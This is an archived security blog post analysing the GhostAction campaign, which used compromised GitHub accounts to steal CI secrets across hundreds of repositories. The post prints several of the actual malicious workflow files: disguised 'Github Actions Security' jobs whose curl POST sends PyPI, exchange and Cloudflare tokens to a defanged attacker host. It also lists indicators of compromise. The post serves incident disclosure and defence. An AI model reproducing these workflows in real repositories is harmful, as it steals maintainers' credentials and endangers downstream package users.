---
url: "https://blog.gitguardian.com/ghostaction-campaign-3-325-secrets-stolen/"
title: "The GhostAction Campaign: 3,325 Secrets Stolen Through Compromised GitHub Workflows"
site: "GitGuardian Blog - Take Control of Your Secrets Security"
published: "2025-09-05T15:25:57.000Z"
captured: "2026-11-02T18:22:48Z"
via: "live"
sha256: "2e78b74317b3082963a832c239808044a2f9b4883aeda2fd058a1fc96be8c3a1"
wayback: "https://web.archive.org/web/20261102193034/https://blog.gitguardian.com/ghostaction-campaign-3-325-secrets-stolen/"
cited_in:
  - "docs/threats/02-supply-chain-packages.md"
---

# The GhostAction Campaign: 3,325 Secrets Stolen Through Compromised GitHub Workflows

> Archived copy of a third-party page, kept so Bigman's findings survive if the original goes away. Copyright stays with the original publisher; cite the original URL.
>
> Original: <https://blog.gitguardian.com/ghostaction-campaign-3-325-secrets-stolen/>
> Snapshot: <https://web.archive.org/web/20261102193034/https://blog.gitguardian.com/ghostaction-campaign-3-325-secrets-stolen/>

[Security Research](https://blog.gitguardian.com/tag/security-research/) [Supply Chain Security](https://blog.gitguardian.com/tag/supply-chain-security/) [Breach explained](https://blog.gitguardian.com/tag/breach-explained/)

# The GhostAction Campaign: 3,325 Secrets Stolen Through Compromised GitHub Workflows

On September 5, 2025, GitGuardian discovered GhostAction, a massive supply chain attack affecting 327 GitHub users across 817 repositories. Attackers injected malicious workflows that exfiltrated 3,325 secrets, including PyPI, npm, and DockerHub tokens via HTTP POST requests to a remote endpoint.

-

## Gaetan Ferry

As a security researcher at GitGuardian, Gaetan is pioneering innovations in secret detection. He uses his offensive security and Red Team background to improve our approach to cybersecurity.

[More posts](https://blog.gitguardian.com/author/gaetan/) by Gaetan Ferry.

https://blog.gitguardian.com/author/gaetan/
-

## Guillaume Valadon

Guillaume is a Cybersecurity Researcher at GitGuardian. He holds a PhD in networking. He likes looking at data and crafting packets. He co-maintains Scapy. And he still remembers what AT+MS=V34 means!

[More posts](https://blog.gitguardian.com/author/guillaumevaladon/) by Guillaume Valadon.

https://blog.gitguardian.com/author/guillaumevaladon/

#### [Gaetan Ferry](https://blog.gitguardian.com/author/gaetan/), [Guillaume Valadon](https://blog.gitguardian.com/author/guillaumevaladon/)

5 Sep 2025 • 9 min read

Follow us on

https://www.linkedin.com/company/gitguardian/ https://bsky.app/profile/gitguardian.com

👉

TL;DR: GitGuardian discovered and investigated the GhostAction campaign, which compromised 327 GitHub users across 817 repositories, stealing 3,325 secrets through malicious workflows disguised as "Github Actions Security." Attackers extracted PyPI, npm, DockerHub, and AWS credentials via HTTP POST to a remote endpoint. 24 packages remain at immediate risk of malicious releases.

## Update: October 6, 2026

GhostAction is back again. [Read our analysis](https://blog.gitguardian.com/ghostaction-github-actions-supply-chain-attack-returns/) of the new wave.

## Update: September 15, 2026

On September 9th, we observed a second wave in the GhostAction attack. About 500 new commits have been pushed to GitHub repositories with a similar malicious GitHub action payload. This new wave targeted only a few new users and repositories. In most cases, only previously compromised repositories have received the updated payload. In total, only 14 new repositories have been compromised.

The new exfiltration endpoint used in the payload is hxxps://carte-avantage.com, which hostname points to the same IP address. Another exfiltration domain also has been used for a short period of time: hxxps://objective-hopper.45-139-104-115.plesk.page

Although the initial attack vector remains unknown, the malicious IP address has recently been used to host phishing payloads.

## Initial discovery

On September 5, 2025, GitGuardian security research was internally alerted of the potential compromise of a GitHub repository associated with the [FastUUID project](https://pypi.org/project/fastuuid/?ref=blog.gitguardian.com). Investigations found that a malicious GitHub workflow file had been injected into the project.

The compromised maintainer, GitHub user Grommash9, pushed the malicious commit on September 2, 2025. The commit, titled "Add Github Actions Security workflow," contained a single GitHub action workflow file designed to steal secrets:

```
name: Github Actions Security

on:
  workflow_dispatch:
  push:

jobs:
  send-secrets:
    runs-on: ubuntu-latest

    steps:
      - name: Prepare Cache Busting
        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV

      - name: Github Actions Security
        run: |
          curl -s -X POST -d 'PYPI_API_TOKEN=${{ secrets.PYPI_API_TOKEN }}' hxxps://bold-dhawan.45-139-104-115.plesk.page
```

Malicious GitHub action workflow file.

This workflow extracts the PyPI token from the CI/CD environment and sends it to an attacker-controlled server. The FastUUID project's legitimate workflow uses this token for package deployment:

```
name: FastUUID CI/CD

on:
  push:
    branches: [master]
    tags:
      - '[0-9]+.[0-9]+.[0-9]+'
  pull_request:
    branches: [master]

jobs:
  test:
    runs-on: ${{ matrix.os }}
    strategy:

[...]

  build-and-publish:
    needs: test
    runs-on: ${{ matrix.os }}
    if: github.event_name == 'push' && contains(github.ref, '.')
    strategy:
      matrix:
        os: [ubuntu-latest, windows-latest, macos-latest]
        python-version: ['3.8', '3.9', '3.10', '3.11', '3.12', '3.13']
    steps:
      - uses: actions/checkout@v4
[...]
      - name: Publish to PyPI
        env:
          TWINE_USERNAME: __token__
          TWINE_PASSWORD: ${{ secrets.PYPI_API_TOKEN }}
        run: twine upload target/wheels/*
```

Legitimate workflow file showing secret names.

The malicious workflow file was run after the threat actor’s commit was pushed, successfully exfiltrating the corresponding PyPI token.

Malicious workflow run.

While this token should have allowed the actor to compromise the FastUUID package on PyPI, we found no evidence of malicious package releases during the compromise window.

No new release from the compromised PyPI token owner.

Our engineering team member, Charles Brossollet, created [an alert issue](https://github.com/fastuuid/fastuuid/issues/56?ref=blog.gitguardian.com) on the GitHub project and reported the incident to PyPI on September 5. At 12:11, PyPI moved the project to read-only status. At 12:30, the compromised user reverted the malicious commit.

Given this rapid response timeline, we expect minimal security impact from the FastUUID compromise. While this package serves as a dependency in widely-used projects, including [BerriAI/litellm](https://github.com/BerriAI/litellm/?ref=blog.gitguardian.com), no malicious releases occurred.

## A Broader Scope Than Expected

The attacker's inaction during the three days following the initial compromise suggested FastUUID was not the primary target. Our investigation revealed a much larger operation.

We discovered that the compromised user pushed identical malicious commits to at least 5 other public repositories and an estimated 10 private repositories on the same date.

Each commit deployed similar workflows with modified secret lists targeting the same exfiltration endpoint:

```
name: Github Actions Security

on:
  workflow_dispatch:
  push:

jobs:
  send-secrets:
    runs-on: ubuntu-latest

    steps:
      - name: Prepare Cache Busting
        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV

      - name: Github Actions Security
        run: |
          curl -s -X POST -d 'PYPI_API_TOKEN=${{ secrets.PYPI_API_TOKEN }}&WHITE_BIT_API_KEY=${{ secrets.WHITE_BIT_API_KEY }}&WHITE_BIT_SECRET_KEY=${{ secrets.WHITE_BIT_SECRET_KEY }}' hxxps://bold-dhawan.45-139-104-115.plesk.page
```

Another malicious workflow targeting different secret types.

Those additional compromised repositories pointed to a potentially more important malicious campaign.

Using our GitHub commit historical dataset, we identified hundreds of similar malicious commits across multiple repositories. Our analysis revealed that 327 users fell victim to this campaign. From this initial investigation, we found no intersection between those users and the recent [S1ngularity attack campaign](https://blog.gitguardian.com/the-nx-s1ngularity-attack-inside-the-credential-leak/)'s victims. Those two incidents are likely unrelated.

The attack pattern remained consistent across all projects. The attacker first enumerated secrets from legitimate workflow files, then hardcoded these secret names into malicious workflows:

```
name: Github Actions Security

on:
 workflow_dispatch:
 push:

jobs:
 send-secrets:
 runs-on: ubuntu-latest

 steps:
 - name: Prepare Cache Busting
 run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV

 - name: Github Actions Security
 run: |
 curl -s -X POST -d 'CF_ACCOUNT_ID=${{ secrets.CF_ACCOUNT_ID }}&CF_API_TOKEN=${{ secrets.CF_API_TOKEN }}&CLOUDFLARE_ACCOUNT_ID=${{ secrets.CLOUDFLARE_ACCOUNT_ID }}&CLOUDFLARE_API_TOKEN=${{ secrets.CLOUDFLARE_API_TOKEN }}' hxxps://bold-dhawan.45-139-104-115.plesk.page
```

We identified 3,325 leaked secrets across the campaign, with DockerHub credentials, GitHub tokens, and NPM tokens representing the most common types. The compromised NPM tokens create ongoing supply chain risks.

The exfiltration endpoint has consistently been set to hxxps://bold-dhawan.45-139-104-115.plesk.page across the campaign. As of Sep 5, 2025 12:39 PM this host name resolved to 45.139.104.115, an IP address hosted at 493networking.cc. This hostname stopped resolving from September 5, 4:15 PM.

## Disclosure

Following our impact assessment, we began alerting affected users and projects by creating issues in every compromised repository. Among 817 affected repositories, 100 had already reverted the malicious changes. We successfully created issues for 573 of the remaining 717 projects—the others were either deleted or had disabled issues.

This disclosure prompted rapid remediation efforts. Initial discussions with affected developers confirmed that attackers were actively exploiting the stolen secrets, including AWS access keys and database credentials.

Further triage was conducted using GitHub issue activity as a proxy for project popularity, with repositories having more issues indicating higher usage and potential impact. This analysis revealed compromised tokens across multiple package ecosystems, including Rust crates and npm packages. Several companies were found to have their entire SDK portfolio compromised, with malicious workflows affecting their Python, Rust, JavaScript, and Go repositories simultaneously.

On Sep 5, 2025, at 3:50pm, we notified GitHub, NPM and PyPI security teams of the campaign, and we are maintaining ongoing surveillance of those and other package registries to verify that no compromised tokens were used to publish malicious artifacts. From our initial investigations, so far, 9 NPM and 15 PyPI packages are at risk of compromise in the next hours or days.

## Indicators of Compromise (IOCs)

### Network Indicators

- Malicious Endpoints: hxxps://bold-dhawan.45-139-104-115.plesk.page, hxxps://carte-avantage.com, hxxps://objective-hopper.45-139-104-115.plesk.page
- IP Address: 45.139.104.115
- HTTP Method: POST requests with secret data

### GitHub Workflow Indicators

- Malicious Workflow Name: Github Actions Security
- File Path: .github/workflows/github_actions_security.yml
- Commit Messages: "Add Github Actions Security workflow"

[The Nx “s1ngularity” Attack: Inside the Credential Leak

On August 26, 2025, Nx, the popular build platform with millions of weekly downloads, was compromised with credential-harvesting malware. Using GitGuardian’s monitoring data, we analyzed the exfiltrated credentials and reconstructed a fuller scope of exposure.

GitGuardian Blog - Take Control of Your Secrets SecurityGuillaume Valadon](https://blog.gitguardian.com/the-nx-s1ngularity-attack-inside-the-credential-leak/)

## FAQ

What is the GhostAction campaign?

The GhostAction campaign is a large-scale supply chain attack discovered by GitGuardian on September 5, 2025. Attackers compromised 327 GitHub user accounts to inject malicious workflows that stole 3,325 secrets from CI/CD environments across 817 repositories. The attack targeted credentials like PyPI tokens, npm tokens, DockerHub credentials, GitHub tokens, and AWS access keys.

How did the GhostAction attack work?

Attackers first gained access to GitHub user accounts, then analyzed legitimate workflow files to identify which secrets were available. They injected malicious workflows disguised as "Github Actions Security" that extracted secrets from the CI/CD environment and sent them via HTTP POST requests to an attacker-controlled endpoint at bold-dhawan.45-139-104-115.plesk.page.

What types of secrets were stolen in the GhostAction campaign?

The campaign targeted a wide variety of credentials including PyPI API tokens, npm tokens, DockerHub credentials, GitHub personal access tokens, AWS access keys, database credentials, Cloudflare API tokens, and other CI/CD secrets. DockerHub credentials, GitHub tokens, and npm tokens were the most commonly targeted types across the compromised repositories.

Were any malicious packages published using the stolen credentials?

As of the disclosure date, no malicious packages have been published using the compromised tokens. However, GitGuardian identified 24 packages (9 npm and 15 PyPI) that remain at immediate risk of compromise. The security teams at GitHub, npm, and PyPI have been notified and are monitoring for malicious activity.

How can developers protect against similar GitHub workflow attacks?

Developers should regularly audit their repository access permissions, monitor for unexpected commits or workflow changes, use environment-specific secrets with minimal permissions, enable GitHub's security alerts, and implement additional secret scanning tools. Organizations should also review who has write access to their repositories and consider using branch protection rules that require reviews for workflow changes.

What should I do if my repository was affected by GhostAction?

If your repository was compromised, immediately revoke and rotate all secrets that may have been exposed, review your repository's commit history for malicious changes, remove any unauthorized workflow files, audit repository access permissions, and monitor your published packages for any unauthorized releases. GitGuardian created issues in affected repositories to alert maintainers.

https://www.gitguardian.com/interactive-demo?ref=blog.gitguardian.com

https://blog.gitguardian.com/ai-agent-security-six-controls/

[Artificial Intelligence](https://blog.gitguardian.com/tag/artificial-intelligence/) [Security Research](https://blog.gitguardian.com/tag/security-research/) [Best practices](https://blog.gitguardian.com/tag/best-practices/)

[# AI Agent Security: Six Controls From Nine Real Incidents](https://blog.gitguardian.com/ai-agent-security-six-controls/)

An AI agent runs with your credentials and acts before you can stop it. Nine incidents show what that costs. Six controls limit the damage: sandbox the agent, scope its credentials, lock its configuration, log every call, scan the workspace first, and deny by default.

https://blog.gitguardian.com/author/guillaumevaladon/

[### Guillaume Valadon](https://blog.gitguardian.com/author/guillaumevaladon/)

9 Oct 2026 – 13 min read

https://blog.gitguardian.com/ghostaction-github-actions-supply-chain-attack-returns/

[Security Research](https://blog.gitguardian.com/tag/security-research/) [Breach explained](https://blog.gitguardian.com/tag/breach-explained/)

[# The campaign that never stopped: tracking GhostAction from 2025 to 2026](https://blog.gitguardian.com/ghostaction-github-actions-supply-chain-attack-returns/)

The GhostAction supply chain campaign hit 772 public GitHub repositories between Aug. 31 and Sept. 30, 2026, targeting 2,577 secrets. Between Oct 8-9 a new burst hit 30k more, and this time the workflows ran.

https://blog.gitguardian.com/author/gaetan/

[### Gaetan Ferry](https://blog.gitguardian.com/author/gaetan/)

7 Oct 2026 – 9 min read

https://blog.gitguardian.com/inside-the-litellm-hack/

[Security Research](https://blog.gitguardian.com/tag/security-research/) [Breach explained](https://blog.gitguardian.com/tag/breach-explained/)

[# Inside the LiteLLM hack: 153GB, 433,909 Files, 2,488 Organizations](https://blog.gitguardian.com/inside-the-litellm-hack/)

Attackers dumped everything they harvested from LiteLLM builds during a 40-minute window in March. Here is what is inside and what it says about where secrets live.

https://blog.gitguardian.com/author/cybersecurity/

[### Cybersecurity research team](https://blog.gitguardian.com/author/cybersecurity/)

14 Aug 2026 – 3 min read

https://blog.gitguardian.com/40-million-fake-push-when-spam-commits-took-over-the-public-github/

[Security Research](https://blog.gitguardian.com/tag/security-research/)

[# 40 Million Fake Push: When Spam Commits Took Over The Public GitHub](https://blog.gitguardian.com/40-million-fake-push-when-spam-commits-took-over-the-public-github/)

Millions of fake commits are flooding GitHub's public feed. We followed the trail to a rebranded gambling site hiding behind a defunct lottery brand.

https://blog.gitguardian.com/author/gaetan/

[### Gaetan Ferry](https://blog.gitguardian.com/author/gaetan/)

5 Aug 2026 – 7 min read
